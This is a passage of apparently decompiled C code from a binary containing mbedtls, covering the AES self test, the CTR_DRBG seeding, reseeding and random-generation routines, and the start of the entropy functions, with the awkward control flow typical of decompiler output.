                int32_t v34 = v33; // 0x804ac94
                g4 = v34;
                int32_t v35 = *(int32_t *)(4 * (int32_t)v32 + (int32_t)&g207); // 0x804ac9b
                int32_t v36 = *(int32_t *)(4 * v34 + (int32_t)&g208); // 0x804aca2
                *(int32_t *)(v26 + v24) = v36 ^ v35 ^ v31 ^ v30;
                int32_t v37 = 1; // 0x804acac
                int32_t v38 = v21; // 0x804acb4
                // branch -> 0x804ac5a
                while (v37 != 4) {
                    // 0x804ac5a
                    v26 = 4 * v37;
                    v27 = *(int32_t *)(v26 + v17);
                    v28 = *(char *)(v27 % 256 + (int32_t)&g199);
                    v29 = *(char *)(v27 / 0x1000000 + (int32_t)&g199);
                    v30 = *(int32_t *)(4 * (int32_t)v29 + (int32_t)&g209);
                    v31 = *(int32_t *)(4 * (int32_t)v28 + (int32_t)&g206);
                    v32 = *(char *)(v27 / 256 % 256 + (int32_t)&g199);
                    v33 = *(char *)(v27 / 0x10000 % 256 + (int32_t)&g199);
                    v34 = v33;
                    g4 = v34;
                    v35 = *(int32_t *)(4 * (int32_t)v32 + (int32_t)&g207);
                    v36 = *(int32_t *)(4 * v34 + (int32_t)&g208);
                    *(int32_t *)(v26 + v38) = v36 ^ v35 ^ v31 ^ v30;
                    v37++;
                    v38 = v21;
                    // continue -> 0x804ac5a
                }
                int32_t v39 = v38 + 16; // 0x804acb4
                v21 = v39;
                v17 -= 16;
                if (v25 == 1) {
                    // break -> 0x804acc3
                    break;
                }
                v24 = v39;
                v25--;
                // continue -> 0x804ac58
            }
            // 0x804acc3
            v22 = 16 * (1 - v18) + v16;
            v23 = 16 * v20 + v19;
            // branch -> 0x804ace6
        }
        // 0x804ace6
        *(int32_t *)v23 = *(int32_t *)v22;
        *(int32_t *)(v23 + 4) = *(int32_t *)(v22 + 4);
        *(int32_t *)(v23 + 8) = *(int32_t *)(v22 + 8);
        *(int32_t *)(v23 + 12) = *(int32_t *)(v22 + 12);
        // branch -> 0x804ad2c
    }
    // 0x804ad2c
    *(char *)v4 = 0;
    int32_t v40 = v4 + 1; // 0x804ad3b
    // branch -> 0x804ad38
    int32_t v41;
    while (v40 != (int32_t)&v41) {
        // 0x804ad38
        *(char *)v40 = 0;
        v40++;
        // continue -> 0x804ad38
    }
    // 0x804ad42
    g3 = v2;
    g7 = v1;
    return result;
}

// Address range: 0x804ad80 - 0x804b7ef
int32_t mbedtls_aes_self_test(int32_t a1) {
    int32_t v1;
    int32_t v2 = &v1; // 0x804ad80_0
    int32_t v3 = g5; // 0x804ad85
    int32_t v4 = g7; // 0x804ad86
    int32_t v5 = g3; // 0x804ad87
    *(int32_t *)(v2 - 140) = 0;
    int32_t v6 = 4; // 0x804ad99206
    int32_t v7; // 0x804ada1_0
    int32_t v8; // 0x804ae0a_0
    int32_t v9; // edx
    int32_t v10;
    int32_t v11;
    int32_t v12;
    int32_t v13; // 0x804adce
    int32_t v14; // 0x804adce
    if (v6 < 32) {
        *(int32_t *)(v6 - 140 + v2) = 0;
        int32_t v15 = v6 + 4; // 0x804ad99
        while (v15 < 32) {
            // 0x804ad8e
            *(int32_t *)(v15 - 140 + v2) = 0;
            v15 += 4;
            // continue -> 0x804ad8e
        }
        // 0x804ada1
        v7 = &v12;
        mbedtls_aes_init((char *)&v12);
        v9 = &v11;
        v8 = &v10;
        // branch -> 0x804adbf
        for (uint32_t i = 0; i < 6; i++) {
            // 0x804adbf
            v14 = i / 2;
            v13 = i % 2;
            g7 = v14;
            int32_t v16; // ebx
            int32_t v17; // 0x804ade3
            if (a1 == 0) {
              lab_0x804addb:
                // 0x804addb
                v16 = 64 * v14 + 128;
                v17 = v9;
                // branch -> 0x804ade1
            } else {
              lab_0x804b4db:;
                int32_t v18 = (int32_t)"enc"; // 0x804b4f6
                if (v13 == 0) {
                    // if_804b4ea_0_true
                    v18 = (int32_t)"dec";
                    // branch -> after_if_804b4ea_0
                }
                int32_t v19 = 64 * (v14 + 2); // 0x804b4ed
                v16 = v19;
                int32_t v20 = v9; // 0x804b4f0
                printf("  AES-ECB-%3d (%s): ", v19, (char *)v18);
                v9 = v20;
                v17 = v20;
                // branch -> 0x804ade1
            }
            // 0x804ade1
            *(int32_t *)v17 = 0;
            *(int32_t *)(v9 + 4) = 0;
            *(int32_t *)(v9 + 8) = 0;
            *(int32_t *)(v9 + 12) = 0;
            g5 = v8;
            int32_t v21 = v16; // 0x804ae10
            g3 = 0;
            int32_t str = v9; // 0x804ae16
            int32_t str2;
            if (v13 == 0) {
                // 0x804ae04
                mbedtls_aes_setkey_dec(&v12, v8, v21);
                g3++;
                mbedtls_aes_crypt_ecb(v7, 0, str, str);
                int32_t v22 = g3; // 0x804ae57
                v9 = str;
                // branch -> 0x804ae30
                while (v22 != 0x2710) {
                    // 0x804ae30
                    g3 = v22 + 1;
                    mbedtls_aes_crypt_ecb(v7, 0, str, str);
                    v22 = g3;
                    v9 = str;
                    // continue -> 0x804ae30
                }
                // 0x804ae65
                str2 = 16 * g7 + (int32_t)&g11;
                // branch -> 0x804ae6e
            } else {
                // 0x804b468
                mbedtls_aes_setkey_enc(&v12, v8, v21);
                g3++;
                mbedtls_aes_crypt_ecb(v7, 1, str, str);
                int32_t v23 = g3; // 0x804b4bf
                v9 = str;
                // branch -> 0x804b498
                while (v23 != 0x2710) {
                    // 0x804b498
                    g3 = v23 + 1;
                    mbedtls_aes_crypt_ecb(v7, 1, str, str);
                    v23 = g3;
                    v9 = str;
                    // continue -> 0x804b498
                }
                // 0x804b4cd
                str2 = 16 * g7 + (int32_t)&g12;
                // branch -> 0x804ae6e
            }
            uint32_t strncmp_rc = strncmp((char *)str, (char *)str2, 16);
            g237 = strncmp_rc % 2 == 0;
            int32_t v24 = str;
            if (strncmp_rc % 2 == 0) {
                // 0x804ae7d
                if (a1 != 0) {
                    // 0x804b736
                    puts("passed");
                    // branch -> 0x804ae88
                }
                // 0x804ae88
                // PHI copies at the loop end
                // loop 0x804adbf end
                continue;
            }
            // 0x804b43d
            if (a1 == 0) {
                // 0x804b2e4
                g1 = 1;
                // branch -> 0x804b2e9
            } else {
                // 0x804b448
                puts("failed");
                g1 = 1;
                v9 = v24;
                // branch -> 0x804b2e9
            }
            // 0x804b2e9
            *(char *)v7 = 0;
            int32_t v25 = v7 + 1; // 0x804b2f3
            // branch -> 0x804b2f0
            while (v25 != v9) {
                // 0x804b2f0
                *(char *)v25 = 0;
                v25++;
                // continue -> 0x804b2f0
            }
            // 0x804b2fa
            g3 = v5;
            g7 = v4;
            g5 = v3;
            return g1;
        }
    }
    // 0x804ada1
    v7 = &v12;
    mbedtls_aes_init((char *)&v12);
    v9 = &v11;
    v8 = &v10;
    // branch -> 0x804adbf
    for (uint32_t i = 0; i < 6; i++) {
        // 0x804adbf
        v14 = i / 2;
        v13 = i % 2;
        g7 = v14;
        if (a1 == 0) {
            goto lab_0x804addb;
        }
        goto lab_0x804b4db;
    }
}

// Address range: 0x804b7f0 - 0x804b7ff
int32_t mbedtls_ctr_drbg_set_prediction_resistance(int32_t result, int32_t a2) {
    // 0x804b7f0
    *(int32_t *)(result + 20) = a2;
    return result;
}

// Address range: 0x804b800 - 0x804b80f
int32_t mbedtls_ctr_drbg_set_entropy_len(int32_t result, int32_t a2) {
    // 0x804b800
    *(int32_t *)(result + 24) = a2;
    return result;
}

// Address range: 0x804b810 - 0x804b81f
int32_t mbedtls_ctr_drbg_set_reseed_interval(int32_t result, int32_t a2) {
    // 0x804b810
    *(int32_t *)(result + 28) = a2;
    return result;
}

// Address range: 0x804b820 - 0x804b859
int32_t ctr_drbg_self_test_entropy(int32_t a1, char * a2, int32_t a3) {
    // 0x804b820
    memcpy(a2, (char *)(g211 + a1), a3);
    g211 += a3;
    return 0;
}

// Address range: 0x804b85a - 0x804b85f
int32_t function_804b85a(int32_t a1) {
    // 0x804b85a
    return g5;
}

// Address range: 0x804b860 - 0x804b87f
int32_t mbedtls_ctr_drbg_init(char * a1) {
    // 0x804b860
    memset(a1, 0, 80);
    return 0;
}

// Address range: 0x804b880 - 0x804b94f
int32_t ctr_drbg_update_internal(int32_t a1, int32_t a2) {
    int32_t v1 = g5; // 0x804b888
    int32_t v2 = g7; // 0x804b889
    int32_t v3 = g6; // 0x804b88a
    int32_t v4 = g3; // 0x804b88c
    int32_t v5;
    int32_t v6 = &v5; // 0x804b88d_0
    g3 = v6;
    int32_t v7 = g1; // 0x804b895
    memset((char *)&v5, 0, 12);
    g5 = v7;
    g7 = v6;
    int32_t v8 = v7 + 32; // 0x804b8ad
    int32_t v9 = v7; // 0x804b8c4
    // branch -> 0x804b8b3
    while (true) {
        char * v10 = (char *)(v9 + 15); // 0x804b8bb_0
        *v10 = (char)((int32_t)*v10 + 1);
        mbedtls_aes_crypt_ecb(v8, 1, g5, g7);
        int32_t v11 = g7; // 0x804b8e8
        int32_t v12;
        if (v11 == (int32_t)&v12) {
            int32_t v13 = 0; // eax
            g7 = v3;
            int32_t v14 = 0; // 0x804b904
            // branch -> 0x804b900
            while (true) {
                char * v15 = (char *)(g3 + v14); // 0x804b904_0
                *v15 = *v15 ^ *(char *)(v3 + v14);
                int32_t v16 = v13 + 1; // 0x804b907
                v13 = v16;
                if (v16 == 48) {
                    // 0x804b90f
                    mbedtls_aes_setkey_enc((int32_t *)v8, g3, 256);
                    g6 = v7;
                    *(int32_t *)v7 = v12;
                    int32_t v17;
                    *(int32_t *)(g6 + 4) = v17;
                    int32_t v18;
                    *(int32_t *)(g6 + 8) = v18;
                    int32_t v19;
                    *(int32_t *)(g6 + 12) = v19;
                    g3 = v4;
                    g7 = v2;
                    g5 = v1;
                    return 0;
                }
                // 0x804b900
                v14 = v16;
                v3 = g7;
                // branch -> 0x804b900
            }
        } else {
            // 0x804b8ed
            g7 = v11 + 16;
            v9 = g5;
            // branch -> 0x804b8b3
            continue;
        }
    }
}

// Address range: 0x804b950 - 0x804bb7f
int32_t block_cipher_df(int32_t a1, int32_t a2, int32_t a3) {
    int32_t v1 = g5; // 0x804b953
    int32_t v2 = g7; // 0x804b954
    int32_t v3 = g3; // 0x804b955
    int32_t v4 = g4; // 0x804b956
    int32_t v5 = g1; // 0x804b964
    g1 = -56;
    int32_t v6;
    if (v4 >= 385) {
        // 0x804b971
        g3 = v3;
        g7 = v2;
        g5 = v1;
        g2 = v6;
        return -56;
    }
    // 0x804b97c
    int32_t v7;
    int32_t v8 = &v7; // 0x804b97c_0
    g5 = v8;
    int32_t v9;
    memset((char *)&v7, (int32_t)&v9, 104);
    int32_t v10;
    int32_t v11 = &v10; // 0x804b997_0
    mbedtls_aes_init((char *)&v10);
    int32_t v12;
    memcpy((char *)&v12, (char *)g6, v4);
    int32_t v13;
    int32_t v14 = &v13; // 0x804b9ed_0
    int32_t v15 = 0; // eax
    *(char *)(g2 - 792 + v4) = -128;
    int32_t v16 = v15; // 0x804ba10
    *(char *)(v16 - 72 + g2) = (char)v16;
    int32_t v17 = v15 + 1; // 0x804ba14
    // branch -> 0x804ba10
    while (v17 != 32) {
        // 0x804ba10
        v16 = v17;
        *(char *)(v16 - 72 + g2) = (char)v16;
        v17++;
        // continue -> 0x804ba10
    }
    // 0x804ba1c
    g5 = v14;
    int32_t v18;
    g3 = &v18;
    mbedtls_aes_setkey_enc(&v10, v14, 256);
    int32_t v19;
    int32_t v20 = &v19; // 0x804ba3c_0
    int32_t v21 = v20;
    // branch -> 0x804ba45
  lab_0x804ba45:
    while (true) {
        // 0x804ba45
        g5 = v4 + 25;
        g7 = v8;
        v18 = 0;
        // branch -> 0x804ba70
        while (true) {
            // 0x804ba70
            v15 = 0;
            int32_t v22 = 0; // 0x804ba7c
            int32_t v23 = v8; // 0x804ba78
            // branch -> 0x804ba78
            while (true) {
                char * v24 = (char *)(g3 + v22); // 0x804ba7c_0
                char v25 = *v24; // 0x804ba7c
                *v24 = v25 ^ *(char *)(v23 + v22);
                int32_t v26 = v15 + 1; // 0x804ba7f
                v15 = v26;
                if (v26 == 16) {
                    int32_t v27 = g5; // 0x804ba87
                    int32_t v28 = 16; // 0x804ba8d
                    if (v27 < 17) {
                        // if_804ba8a_0_true
                        v28 = v27;
                        // branch -> after_if_804ba8a_0
                    }
                    // after_if_804ba8a_0
                    g5 = v27 - v28;
                    int32_t v29 = g3; // 0x804ba95
                    mbedtls_aes_crypt_ecb(v11, 1, v29, v29);
                    if (g5 == 0) {
                        int32_t v30 = v21; // edx
                        *(int32_t *)v21 = v18;
                        *(int32_t *)(v30 + 4) = 0;
                        *(int32_t *)(v30 + 8) = 0;
                        *(int32_t *)(v30 + 12) = 0;
                        g5 = v14;
                        int32_t v31 = v30 + 16; // 0x804bad8
                        if (v31 == v14) {
                            // break (via goto) -> 0x804baf0
                            goto lab_0x804baf0;
                        }
                        v21 = v31;
                        // continue (via goto) -> 0x804ba45
                        goto lab_0x804ba45;
                    } else {
                        int32_t v32 = g7 + 16; // 0x804bab1
                        g7 = v32;
                        v8 = v32;
                        // branch -> 0x804ba70
                        break;
                    }
                    while (true) {
                        // 0x804ba70
                        v15 = 0;
                        v22 = 0;
                        v23 = v8;
                        // branch -> 0x804ba78
                        break;
                    }
                  lab_0x804baf0:
                    // 0x804baf0
                    g7 = 0;
                    int32_t v33;
                    g3 = &v33;
                    mbedtls_aes_setkey_enc(&v10, v20, 256);
                    g5 = v5;
                    int32_t v34 = g3; // 0x804bb1e
                    mbedtls_aes_crypt_ecb(v11, 1, v34, v34);
                    int32_t v35 = g7; // 0x804bb38
                    int32_t v36 = v35 + g5; // 0x804bb38
                    v15 = v36;
                    int32_t v37 = v35 + 16; // 0x804bb3b
                    g7 = v37;
                    *(int32_t *)v36 = v33;
                    int32_t v38;
                    *(int32_t *)(v15 + 4) = v38;
                    int32_t v39;
                    *(int32_t *)(v15 + 8) = v39;
                    int32_t v40;
                    *(int32_t *)(v15 + 12) = v40;
                    // branch -> 0x804bb18
                    while (v37 != 48) {
                        // 0x804bb18
                        v34 = g3;
                        mbedtls_aes_crypt_ecb(v11, 1, v34, v34);
                        v35 = g7;
                        v36 = v35 + g5;
                        v15 = v36;
                        v37 = v35 + 16;
                        g7 = v37;
                        *(int32_t *)v36 = v33;
                        *(int32_t *)(v15 + 4) = v38;
                        *(int32_t *)(v15 + 8) = v39;
                        *(int32_t *)(v15 + 12) = v40;
                        // continue -> 0x804bb18
                    }
                    // 0x804bb57
                    g6 = v11;
                    mbedtls_aes_free((char *)&v10);
                    g1 = 0;
                    g3 = v3;
                    g7 = v2;
                    g5 = v1;
                    g2 = v6;
                    return 0;
                }
                // 0x804ba78
                v22 = v26;
                v23 = g7;
                // branch -> 0x804ba78
            }
        }
    }
}

// Address range: 0x804bb80 - 0x804bc5f
int32_t mbedtls_ctr_drbg_reseed(int32_t a1, char * a2, int32_t a3) {
    int32_t v1;
    g2 = &v1;
    int32_t v2 = g7; // 0x804bb89
    g7 = a1;
    int32_t v3 = g3; // 0x804bb8f
    g3 = a3;
    int32_t v4 = g5; // 0x804bb95
    int32_t result; // 0x804bbb5_2
    if (*(int32_t *)(a1 + 24) + a3 < 385) {
        // 0x804bbb8
        int32_t v5;
        int32_t v6 = &v5; // 0x804bbb8_0
        g5 = v6;
        g237 = true;
        g6 = v6;
        int32_t v7;
        char * set_mem = memset((char *)&v5, (int32_t)&v7, 96);
        g4 = (int32_t)set_mem;
        int32_t v8 = g7; // 0x804bbd9
        int32_t v9 = *(int32_t *)(v8 + 24); // 0x804bbd9
        int32_t v10 = *(int32_t *)(v8 + 316); // 0x804bbe4
        g1 = v10;
        char * v11 = (char *)v10; // bp-460
        ((int32_t (*)(int32_t, int32_t, int32_t))*(int32_t *)(v8 + 312))(v10, v6, v9);
        int32_t v12 = g1; // 0x804bbf3
        g6 = v12;
        if (v12 == 0) {
            int32_t v13 = g3; // 0x804bbfe
            int32_t v14 = *(int32_t *)(g7 + 24); // 0x804bc00
            g4 = v14;
            int32_t v15 = v9;
            char * v16 = (char *)&v5;
            if (v13 != 0) {
                // 0x804bc2d
                if (a2 != NULL) {
                    char * v17 = (char *)(v14 + v6);
                    v11 = v17;
                    memcpy(v17, a2, v13);
                    g4 = g3 + v14;
                    v15 = v13;
                    v16 = a2;
                    // branch -> 0x804bc05
                } else {
                    v15 = v9;
                    v16 = (char *)&v5;
                }
            }
            // 0x804bc05
            g6 = v6;
            g1 = v6;
            int32_t v18 = (int32_t)v16;
            block_cipher_df((int32_t)v11, v18, v15);
            g6 = v6;
            g1 = g7;
            ctr_drbg_update_internal((int32_t)v11, v18);
            *(int32_t *)(g7 + 16) = 1;
            result = 0;
            // branch -> 0x804bba9
        } else {
            result = -52;
        }
    } else {
        // 0x804bba4
        result = -56;
        // branch -> 0x804bba9
    }
    // 0x804bba9
    g3 = v3;
    g7 = v2;
    g5 = v4;
    return result;
}

// Address range: 0x804bc60 - 0x804bce6
int32_t mbedtls_ctr_drbg_seed_entropy_len(int32_t a1, int32_t a2, int32_t a3, int32_t a4, int32_t a5, int32_t a6) {
    int32_t v1 = g3; // 0x804bc68
    g3 = a1;
    int32_t v2 = g7; // 0x804bc6e
    int32_t v3; // bp-60
    int32_t v4 = &v3; // 0x804bc71_0
    g7 = v4;
    int32_t v5 = g5; // 0x804bc74
    v3 = 0;
    int32_t v6 = 4; // eax
    int32_t v7 = 4; // 0x804bc7e13
    // branch -> 0x804bc77
    while (true) {
        // 0x804bc77
        *(int32_t *)(v4 + v7) = 0;
        int32_t v8 = v6 + 4; // 0x804bc7e
        v6 = v8;
        if (v8 >= 32) {
            int32_t v9 = g3 + 32; // 0x804bc86
            g5 = v9;
            mbedtls_aes_init((char *)v9);
            *(int32_t *)(g3 + 312) = a2;
            *(int32_t *)(g3 + 316) = a3;
            *(int32_t *)(g3 + 28) = 0x2710;
            *(int32_t *)(g3 + 24) = a6;
            mbedtls_aes_setkey_enc((int32_t *)g5, g7, 256);
            int32_t result = mbedtls_ctr_drbg_reseed(g3, (char *)a4, a5); // 0x804bcd5
            g1 = result;
            g3 = v1;
            g7 = v2;
            g5 = v5;
            int32_t v10;
            g2 = v10;
            return result;
        }
        // 0x804bc77
        v4 = g7;
        v7 = v8;
        // branch -> 0x804bc77
    }
}

// Address range: 0x804bce7 - 0x804bcef
int32_t function_804bce7(int32_t a1) {
    // 0x804bce7
    return g7;
}

// Address range: 0x804bcf0 - 0x804bd26
int32_t mbedtls_ctr_drbg_seed(int32_t a1, int32_t a2, int32_t a3, int32_t a4, int32_t a5) {
    // 0x804bcf0
    return mbedtls_ctr_drbg_seed_entropy_len(a1, a2, a3, a4, a5, 48);
}

// Address range: 0x804bd27 - 0x804bd2f
int32_t function_804bd27(int32_t a1) {
    // 0x804bd27
    return g7;
}

// Address range: 0x804bd30 - 0x804be6f
int32_t mbedtls_ctr_drbg_random_with_add(char * a1, int32_t a2, uint32_t a3, char * a4, uint32_t a5) {
    // 0x804bd30
    int32_t v1;
    char * v2 = (char *)v1; // bp-140
    int32_t v3 = g7; // 0x804bd3e
    g7 = a3;
    int32_t v4 = g3; // 0x804bd44
    g6 = a5;
    int32_t v5 = g5; // 0x804bd4a
    g3 = (int32_t)a1;
    if (a3 >= 1025) {
        // 0x804bd58
        g3 = v4;
        g7 = v3;
        g5 = v5;
        return -54;
    }
    // 0x804bd68
    int32_t result; // 0x804bd64_2
    if (a5 <= 256) {
        // 0x804bd72
        int32_t v6;
        int32_t v7 = &v6; // 0x804bd72_0
        g5 = v7;
        int32_t v8;
        memset((char *)&v6, (int32_t)&v8, 12);
        int32_t v9 = g3; // 0x804bd84
        char * v10; // 0x804bdd3_0
        int32_t * v11; // 0x804be3c_0
        int32_t v12;
        int32_t v13; // 0x804be1c
        int32_t v14; // 0x804bdba
        int32_t v15; // 0x804be0b
        if (*(int32_t *)(v9 + 16) <= *(int32_t *)(v9 + 28)) {
            // 0x804bd90
            if (*(int32_t *)(v9 + 20) == 0) {
                int32_t v16 = g6; // 0x804bd9b
                int32_t v17;
                if (v16 != 0) {
                    // 0x804bd9f
                    g4 = v16;
                    g6 = (int32_t)a4;
                    g1 = v7;
                    int32_t v18;
                    block_cipher_df((int32_t)v2, v17, v18);
                    g6 = v7;
                    g1 = g3;
                    ctr_drbg_update_internal((int32_t)v2, v17);
                    // branch -> 0x804bdb6
                }
                char * v19 = (char *)v17;
                if (g7 != 0) {
                    // 0x804bdba
                    v14 = g3;
                    int32_t v20 = v14; // 0x804bddc
                    v13 = a2;
                    // branch -> 0x804bdc8
                    while (true) {
                        // 0x804bdc8
                        v10 = (char *)(v20 + 15);
                        *v10 = (char)((int32_t)*v10 + 1);
                        g5 = 16;
                        mbedtls_aes_crypt_ecb(v14 + 32, 1, g3, (int32_t)&v12);
                        v15 = g7;
                        int32_t v21; // 0x804be18
                        if (v15 < 17) {
                          lab_if_804be15_0_true:
                            // if_804be15_0_true
                            g5 = v15;
                            v21 = v15;
                            // branch -> after_if_804be15_0
                        } else {
                          lab_0x804bdc8:
                            // 0x804bdc8
                            v21 = g5;
                            // branch -> after_if_804be15_0
                        }
                        char * v22 = (char *)v13;
                        v2 = v22;
                        memcpy(v22, (char *)&v12, v21);
                        int32_t v23 = g7; // 0x804be24
                        int32_t v24 = g5; // 0x804be24
                        g7 = v23 - v24;
                        if (v23 != v24) {
                            // 0x804be28
                            v20 = g3;
                            v13 += v24;
                            // branch -> 0x804bdc8
                            continue;
                        } else {
                            v19 = (char *)&v12;
                        }
                    }
                }
                // 0x804be30
                g6 = v7;
                g1 = g3;
                ctr_drbg_update_internal((int32_t)v2, (int32_t)v19);
                v11 = (int32_t *)(g3 + 16);
                *v11 = *v11 + 1;
                // branch -> 0x804bd58
                // 0x804bd58
                g3 = v4;
                g7 = v3;
                g5 = v5;
                return 0;
            }
        }
        int32_t v25 = mbedtls_ctr_drbg_reseed(v9, a4, g6); // 0x804be53
        if (v25 == 0) {
            // 0x804bdb6
            if (g7 != 0) {
                // 0x804bdba
                v14 = g3;
                v13 = a2;
                // branch -> 0x804bdc8
                while (true) {
                    // 0x804bdc8
                    v10 = (char *)(v14 + 15);
                    *v10 = (char)((int32_t)*v10 + 1);
                    g5 = 16;
                    mbedtls_aes_crypt_ecb(v14 + 32, 1, g3, (int32_t)&v12);
                    v15 = g7;
                    if (v15 < 17) {
                        goto lab_if_804be15_0_true;
                    }
                    goto lab_0x804bdc8;
                }
            }
            // 0x804be30
            g6 = v7;
            g1 = g3;
            ctr_drbg_update_internal((int32_t)(char *)v9, (int32_t)a4);
            v11 = (int32_t *)(g3 + 16);
            *v11 = *v11 + 1;
            result = 0;
            // branch -> 0x804bd58
        } else {
            result = v25;
        }
    } else {
        result = -56;
    }
    // 0x804bd58
    g3 = v4;
    g7 = v3;
    g5 = v5;
    return result;
}

// Address range: 0x804be70 - 0x804bea0
int32_t mbedtls_ctr_drbg_random(int32_t a1, int32_t a2, int32_t a3) {
    int32_t result = mbedtls_ctr_drbg_random_with_add((char *)a1, a2, a3, NULL, 0); // 0x804be9a
    g1 = result;
    int32_t v1;
    g2 = v1;
    return result;
}

// Address range: 0x804bf50 - 0x804bf8f
int32_t mbedtls_ctr_drbg_update(int32_t a1, int32_t a2, int32_t a3) {
    // 0x804bf50
    int32_t v1;
    int32_t v2 = v1; // bp-60
    int32_t v3 = g3; // 0x804bf53
    int32_t v4 = &v2; // 0x804bf54_3
    g1 = a3;
    int32_t v5;
    if (a3 == 0) {
        // 0x804bf82
        g3 = v3;
        g2 = v5;
        return 0;
    }
    // 0x804bf5e
    g6 = a2;
    g4 = 384;
    g3 = v4;
    if (a3 < 385) {
        // if_804bf6e_0_true
        g4 = a3;
        // branch -> after_if_804bf6e_0
    }
    // after_if_804bf6e_0
    g1 = v4;
    block_cipher_df(v1, 0, 0);
    g1 = a1;
    g6 = v4;
    ctr_drbg_update_internal(v2, 0);
    g1 = 0;
    // branch -> 0x804bf82
    // 0x804bf82
    g3 = v3;
    g2 = v5;
    return 0;
}

// Address range: 0x804c090 - 0x804c0cf
int32_t mbedtls_ctr_drbg_free(char * a1) {
    int32_t v1 = (int32_t)a1;
    int32_t result; // 0x804c0c7_2
    if (a1 == NULL) {
        // 0x804c090
        result = g1;
        // branch -> 0x804c0c2
    } else {
        // 0x804c09e
        mbedtls_aes_free((char *)(v1 + 32));
        *(char *)v1 = 0;
        int32_t v2 = v1 + 1; // 0x804c0bb
        // branch -> 0x804c0b8
        while (v2 != v1 + 320) {
            // 0x804c0b8
            *(char *)v2 = 0;
            v2++;
            // continue -> 0x804c0b8
        }
        // 0x804c0c2
        result = v2;
        // branch -> 0x804c0c2
    }
    // 0x804c0c2
    return result;
}

// Address range: 0x804c0d0 - 0x804c30d
int32_t mbedtls_ctr_drbg_self_test(int32_t a1) {
    int32_t v1 = g3; // 0x804c0d9
    int32_t v2;
    g3 = &v2;
    int32_t v3 = g5; // 0x804c0e2
    int32_t v4 = g7; // 0x804c0e5
    mbedtls_ctr_drbg_init((char *)&v2);
    g5 = a1;
    if (a1 != 0) {
        // 0x804c158
        printf("  CTR_DRBG (PR = TRUE) : ");
        // branch -> 0x804c0f7
    }
    // 0x804c0f7
    g211 = 0;
    int32_t v5 = mbedtls_ctr_drbg_seed_entropy_len(g3, (int32_t)ctr_drbg_self_test_entropy, (int32_t)&g13, (int32_t)&g14, 16, 32); // 0x804c12c
    if (v5 == 0) {
        // 0x804c168
        int32_t str;
        int32_t v6 = &str; // 0x804c168_0
        if (mbedtls_ctr_drbg_random(g3, v6, 16) == 0) {
            int32_t v7 = mbedtls_ctr_drbg_random(g3, v6, 16); // 0x804c1a5
            g1 = v7;
            if (v7 == 0) {
                // 0x804c1ae
                g5 = (int32_t)&g15;
                uint32_t strncmp_rc = strncmp((char *)&str, (char *)&g15, 16);
                g237 = strncmp_rc % 2 == 0;
                if (strncmp_rc % 2 == 0) {
                    // 0x804c1c6
                    mbedtls_ctr_drbg_free((char *)g3);
                    g7 = a1;
                    if (a1 != 0) {
                        // 0x804c2f6
                        puts("passed");
                        int32_t chars_printed = printf("  CTR_DRBG (PR = FALSE): ");
                        g1 = chars_printed;
                        return chars_printed;
                    }
                    // 0x804c1d9
                    mbedtls_ctr_drbg_init((char *)g3);
                    g211 = 0;
                    int32_t v8 = mbedtls_ctr_drbg_seed_entropy_len(g3, (int32_t)ctr_drbg_self_test_entropy, (int32_t)&g16, (int32_t)&g17, 16, 32); // 0x804c216
                    if (v8 == 0) {
                        // 0x804c223
                        if (mbedtls_ctr_drbg_random(g3, v6, 16) == 0) {
                            // 0x804c242
                            if (mbedtls_ctr_drbg_reseed(g3, NULL, 0) == 0) {
                                // 0x804c262
                                if (mbedtls_ctr_drbg_random(g3, v6, 16) == 0) {
                                    int32_t memcmp_rc = memcmp((char *)&str, (char *)&g18, 16); // 0x804c297
                                    g1 = memcmp_rc;
                                    if (memcmp_rc == 0) {
                                        // 0x804c2a4
                                        mbedtls_ctr_drbg_free((char *)g3);
                                        g1 = 0;
                                        if (a1 != 0) {
                                            // 0x804c2b8
                                            puts("passed");
                                            putchar(10);
                                            g1 = 0;
                                            // branch -> 0x804c145
                                        }
                                        // 0x804c145
                                        g3 = v1;
                                        g7 = v4;
                                        g5 = v3;
                                        return 0;
                                    }
                                }
                            }
                        }
                    }
                }
            }
        }
    }
    // 0x804c135
    g1 = 1;
    if (a1 == 0) {
        // 0x804c145
        g3 = v1;
        g7 = v4;
        g5 = v3;
        return 1;
    }
    // 0x804c2d8
    puts("failed");
    g3 = v1;
    g1 = 1;
    g7 = v4;
    g5 = v3;
    return 1;
}

// Address range: 0x804c3c0 - 0x804c470
int32_t mbedtls_entropy_init(char * a1) {
    int32_t v1 = g3; // 0x804c3cb
    int32_t v2 = (int32_t)a1; // ebx
    memset(a1, 0, 154);
    mbedtls_sha512_starts((int32_t *)v2, 0);
    int32_t result = *(int32_t *)(v2 + 212); // 0x804c3e6
    if (result > 19) {
        // 0x804c46a
        g3 = v1;
        return result;
    }
    int32_t v3 = 20 * result + v2; // 0x804c3f4
    int32_t result2 = v3; // eax
    *(int32_t *)(v3 + 228) = 32;
    *(int32_t *)(result2 + 232) = 1;
    g6 = *(int32_t *)(v2 + 212);
    *(int32_t *)(result2 + 216) = 0x804cb00;
    *(int32_t *)(result2 + 220) = 0;
    int32_t v4 = g6 + 1; // 0x804c425
    result2 = v4;
    *(int32_t *)(v2 + 212) = v4;
    if (v4 <= 19) {
        int32_t v5 = g6 + 2; // 0x804c436
        g6 = v5;
        int32_t v6 = v2 + 20 * result2; // 0x804c439
        result2 = v6;
        *(int32_t *)(v6 + 228) = 4;
        *(int32_t *)(result2 + 232) = 0;
        *(int32_t *)(result2 + 216) = 0x804cad0;
        *(int32_t *)(result2 + 220) = 0;
        *(int32_t *)(v2 + 212) = v5;
        // branch -> 0x804c46a
    }
    // 0x804c46a
    g3 = v1;
    return result2;
}

// Address range: 0x804c471 - 0x804c47f
int32_t function_804c471(void) {
    // 0x804c471
    entropy_update(0, 0, 0, 0);
    g1 = 0;
    return 0;
}

// Address range: 0x804c480 - 0x804c50f
int32_t entropy_update(int32_t a1, int32_t a2, int32_t a3, int32_t a4) {
    int32_t v1 = g3; // 0x804c489
    int32_t v2 = g1; // 0x804c48c
    g3 = v2;
    g1 = a1;
    int32_t v3 = g7; // 0x804c491
    int32_t v4 = g4; // 0x804c494
    g7 = v4;
    int32_t v5 = g5; // 0x804c496
    g4 = a1;
    g5 = a1;
    int32_t v6; // 0x804c4d0
    if (a1 < 65) {
        v6 = g6;
        // branch -> 0x804c4d0
    } else {
        // 0x804c4a2
        int32_t v7;
        int32_t v8 = &v7; // 0x804c4a2_0
        g7 = v8;
        g5 = 64;
        g1 = mbedtls_sha512(v4, a1, v8, 0);
        g4 = 64;
        v2 = g3;
        v6 = g6 % 256;
